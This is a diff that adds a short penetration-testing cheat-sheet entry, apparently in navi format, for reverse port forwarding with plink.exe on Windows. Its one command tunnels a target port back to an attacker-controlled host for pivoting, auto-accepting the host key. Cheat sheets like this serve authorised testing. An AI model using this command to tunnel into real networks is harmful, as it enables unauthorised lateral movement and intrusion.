@@ -1,0 +1,4 @@
+% putty, windows, forward, pivot, proxy
+
+# Reverse Port forwarding
+cmd.exe /c echo y | .\plink.exe -R <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USERNAME>@<ATTACKING_IP> -i KEYFILE -N
